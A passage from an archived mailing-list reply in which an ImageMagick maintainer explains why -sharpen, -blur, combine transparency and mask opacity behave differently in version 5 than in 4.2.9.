&gt; -sharpen couldn't be used at all at values above like 10 or so. It
&gt; resulted in operations never carried out. Gaussian blurring didn't
&gt; seem to work well. I succeeded in passing values of 15. There was
&gt; an error if a passed &quot;15x5&quot; for example. High Gaussian blur values
&gt; didn't make any difference. Now, can this be true?

Note that the form and range of the arguments has totally changed for
-sharpen and -blur since 4.2.9.  I suspect that this may be related to
the problem you are seeing.
cristy@mystic.es.dupont.com

Version 5 has changed significantly from version 4.  Version 4 had support
methods for the command line utilities.  Version 5 has exported it's
API for others to use directly rather than relying on the command line
utilities.  The good news is that the new API has stabelized and it is
unlikely you will see any changes to the API in the future (except for 
additional API called, the existing API should not change except in
exeptional circumstances).

&gt; problems: Using such as -sharpen and -blur was very slow compared to
&gt; 4.2.9. Blurring was maybe 2 or three times slower. -sharpen couldn't be
&gt; used at all at values above like 10 or so. It resulted in operations
&gt; never carried out.  Gaussian blurring didn't seem to work well. I
&gt; succeeded in passing values of 15. There was an error if a passed
&gt; &quot;15x5&quot; for example. High Gaussian blur values didn't make any
&gt; difference.  Now, can this be true?

Version 5 uses a more sophisticated sharpen/blur algorithm.  The parameter
has changed as well.  The best default value is just 0 which is an
auto sharpen/blur value.

&gt; - &quot;combine&quot; creates a transparent entry in gif-files (or makes an
&gt; alphachannel) when overlaying images. Ver 4.2.9 doesn't. This creates
&gt; the problem that the giffiles are often transparent in dark areas.  -

You can always get rid of transparency with the +matte option.

&gt; &quot;combine&quot; interprets masks reversely to the norm. This means that any
&gt; mask must be negated before rendering.

Opacity has reversed from version 4 to accomodate the SDL API.

&gt; Please give me some insight in what I might do, why version 5 is so
&gt; slow for these operations.

Version 5 may be slower in general because ImageMagick always shoots for
quality over speed.</PRE><P CLASS="western">
<BR><BR>
</P>
<DIV TYPE=FOOTER>
	<P CLASS="footer-western" ALIGN=RIGHT STYLE="margin-top: 0.3cm"><SDFIELD TYPE=PAGE SUBTYPE=RANDOM FORMAT=PAGE>35</SDFIELD></P>
</DIV>
</BODY>
</HTML>